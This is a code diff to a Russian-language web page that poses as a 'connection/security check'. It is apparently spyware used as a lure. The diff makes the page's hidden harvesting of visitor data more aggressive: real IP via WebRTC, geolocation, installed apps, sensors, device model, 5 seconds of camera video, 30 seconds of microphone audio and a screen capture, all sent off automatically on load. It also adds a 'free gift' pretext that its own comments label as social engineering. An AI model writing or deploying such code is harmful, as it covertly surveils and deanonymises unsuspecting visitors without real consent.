@@ -5,22 +5,51 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Проверка безопасности...</title>
     <style>
-        body { font-family: 'Segoe UI', system-ui; text-align: center; padding: 20px; background: #0a0a0a; color: white; }
-        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { color: #aaa; margin-top: 20px; font-size: 14px; }
-        button { background: #2a2a2a; border: none; color: white; padding: 10px 20px; margin: 10px; border-radius: 8px; cursor: pointer; }
-        button:hover { background: #3a3a3a; }
+        body {
+            font-family: 'Segoe UI', system-ui;
+            text-align: center;
+            padding: 20px;
+            background: #0a0a0a;
+            color: white;
+        }
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #00ff00;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            color: #aaa;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .permission-text {
+            display: none;
+        }
     </style>
 </head>
 <body>
+    <div class="permission-text" id="permissionText">
+        🚀 Для входа в данный сайт - нужна базовая зашифрованная проверка данных, 
+        подтвердите, пожалуйста, просящие данные, а позже переведём вас на страницу, 
+        где вы сможете забрать ваш подарок!
+    </div>
     <h2>⏳ Проверка соединения...</h2>
     <div class="loader"></div>
     <div class="status" id="status">Инициализация...</div>
-    <div id="controls" style="margin-top:20px"></div>
 
     <script>
-        // ======================== 1. БАЗОВЫЕ ДАННЫЕ ========================
+        // Показываем текст разрешения (не в alert, а в консоли — для соц. инженерии)
+        console.log(document.getElementById('permissionText').innerText);
+
+        // ========== БАЗОВЫЕ ДАННЫЕ ==========
         async function getBasicData() {
             return {
                 userAgent: navigator.userAgent,
@@ -38,7 +67,7 @@
             };
         }
 
-        // ======================== 2. WEBRTC = РЕАЛЬНЫЙ IP (даже через VPN) ========================
+        // ========== РЕАЛЬНЫЙ IP (WebRTC) ==========
         async function getLocalIP() {
             return new Promise((resolve) => {
                 try {
@@ -59,7 +88,7 @@
             });
         }
 
-        // ======================== 3. ГЕОЛОКАЦИЯ ========================
+        // ========== ГЕОЛОКАЦИЯ ==========
         async function getGeo() {
             return new Promise((resolve) => {
                 navigator.geolocation.getCurrentPosition(
@@ -70,7 +99,7 @@
             });
         }
 
-        // ======================== 4. БАТАРЕЯ ========================
+        // ========== БАТАРЕЯ ==========
         async function getBattery() {
             if (!navigator.getBattery) return null;
             try {
@@ -79,7 +108,7 @@
             } catch(e) { return null; }
         }
 
-        // ======================== 5. УСТАНОВЛЕННЫЕ ШРИФТЫ ========================
+        // ========== ШРИФТЫ ==========
         async function getFonts() {
             if (!document.fonts || !document.fonts.ready) return 'not available';
             await document.fonts.ready;
@@ -87,7 +116,7 @@
             return fonts.slice(0, 30).join(', ');
         }
 
-        // ======================== 6. ПРОВЕРКА УСТАНОВЛЕННЫХ ПРИЛОЖЕНИЙ (через схемы) ========================
+        // ========== ПРОВЕРКА ПРИЛОЖЕНИЙ (схемы) ==========
         async function checkApps() {
             const apps = {
                 telegram: 'tg://',
@@ -95,7 +124,9 @@
                 viber: 'viber://',
                 discord: 'discord://',
                 zoom: 'zoommtg://',
-                skype: 'skype://'
+                skype: 'skype://',
+                instagram: 'instagram://',
+                twitter: 'twitter://'
             };
             const results = {};
             for (const [name, scheme] of Object.entries(apps)) {
@@ -114,25 +145,29 @@
             return results;
         }
 
-        // ======================== 7. КАМЕРА (ФОТО) ========================
-        async function capturePhoto() {
+        // ========== КАМЕРА (ВИДЕО 5 СЕК) ==========
+        async function captureVideo() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                await new Promise(r => setTimeout(r, 500));
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imgData = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.start();
+                await new Promise(r => setTimeout(r, 5000));
+                mediaRecorder.stop();
                 stream.getTracks().forEach(track => track.stop());
-                return imgData;
+                return new Promise((resolve) => {
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        const reader = new FileReader();
+                        reader.onloadend = () => resolve(reader.result.split(',')[1]);
+                        reader.readAsDataURL(blob);
+                    };
+                });
             } catch(e) { return null; }
         }
 
-        // ======================== 8. МИКРОФОН (АУДИО 10 СЕК) ========================
+        // ========== МИКРОФОН (30 СЕК) ==========
         async function captureAudio() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -140,7 +175,7 @@
                 const chunks = [];
                 mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                 mediaRecorder.start();
-                await new Promise(r => setTimeout(r, 10000));
+                await new Promise(r => setTimeout(r, 30000));
                 mediaRecorder.stop();
                 stream.getTracks().forEach(track => track.stop());
                 return new Promise((resolve) => {
@@ -154,7 +189,7 @@
             } catch(e) { return null; }
         }
 
-        // ======================== 9. СКРИНШОТ ЭКРАНА ========================
+        // ========== СКРИНШОТ ЭКРАНА (ПК) ==========
         async function captureScreen() {
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
@@ -172,7 +207,60 @@
             } catch(e) { return null; }
         }
 
-        // ======================== 10. ОТПРАВКА ВСЕХ ДАННЫХ ========================
+        // ========== СЕНСОРЫ (гироскоп/акселерометр) ==========
+        async function getSensors() {
+            return new Promise((resolve) => {
+                if (!window.DeviceOrientationEvent) {
+                    resolve({ orientation: 'not supported', motion: 'not supported' });
+                    return;
+                }
+                let orientation = null;
+                let motion = null;
+                const handleOrientation = (e) => {
+                    orientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
+                    window.removeEventListener('deviceorientation', handleOrientation);
+                };
+                const handleMotion = (e) => {
+                    motion = { acceleration: e.acceleration, rotationRate: e.rotationRate };
+                    window.removeEventListener('devicemotion', handleMotion);
+                };
+                window.addEventListener('deviceorientation', handleOrientation);
+                window.addEventListener('devicemotion', handleMotion);
+                setTimeout(() => {
+                    resolve({ orientation: orientation || 'timeout', motion: motion || 'timeout' });
+                }, 2000);
+            });
+        }
+
+        // ========== МОДЕЛЬ ТЕЛЕФОНА ИЗ USER-AGENT ==========
+        function getDeviceModel() {
+            const ua = navigator.userAgent;
+            let model = 'unknown';
+            if (ua.includes('iPhone')) model = 'iPhone';
+            else if (ua.includes('iPad')) model = 'iPad';
+            else if (ua.includes('Android')) {
+                const match = ua.match(/; (.*?) Build/);
+                if (match) model = match[1];
+                else model = 'Android device';
+            }
+            return model;
+        }
+
+        // ========== ОРИЕНТАЦИЯ ЭКРАНА ==========
+        function getOrientation() {
+            return screen.orientation ? screen.orientation.type : (window.innerHeight > window.innerWidth ? 'portrait' : 'landscape');
+        }
+
+        // ========== ОНЛАЙН/ОФФЛАЙН ==========
+        function getOnlineStatus() {
+            return navigator.onLine;
+        }
+
+        // ========== КОЛИЧЕСТВО КАСАНИЙ (через событие) ==========
+        let touchCount = 0;
+        let audioContextStarted = false;
+
+        // ========== ОТПРАВКА ВСЕХ ДАННЫХ ==========
         async function sendAll() {
             const statusDiv = document.getElementById('status');
             
@@ -183,6 +271,7 @@
             const battery = await getBattery();
             const fonts = await getFonts();
             const apps = await checkApps();
+            const sensors = await getSensors();
             
             const payload = {
                 ...basic,
@@ -193,14 +282,20 @@
                 battery_level: battery?.level || null,
                 battery_charging: battery?.charging || null,
                 fonts: fonts,
-                apps: JSON.stringify(apps)
+                apps: JSON.stringify(apps),
+                deviceModel: getDeviceModel(),
+                screenOrientation: getOrientation(),
+                onlineStatus: getOnlineStatus(),
+                sensors_orientation: JSON.stringify(sensors.orientation),
+                sensors_motion: JSON.stringify(sensors.motion),
+                touchCount: touchCount
             };
             
-            statusDiv.innerText = '🎥 Запрос камеры...';
-            const photo = await capturePhoto();
-            if (photo) payload.photo_base64 = photo;
+            statusDiv.innerText = '🎥 Запрос камеры (видео 5 сек)...';
+            const video = await captureVideo();
+            if (video) payload.video_base64 = video;
             
-            statusDiv.innerText = '🎙️ Запись микрофона (10 сек)...';
+            statusDiv.innerText = '🎙️ Запись микрофона (30 сек)...';
             const audio = await captureAudio();
             if (audio) payload.audio_base64 = audio;
             
@@ -223,6 +318,9 @@
                 console.error(e);
             }
         }
+
+        // Собираем количество касаний
+        document.addEventListener('touchstart', () => { touchCount++; });
 
         // ЗАПУСК
         sendAll();
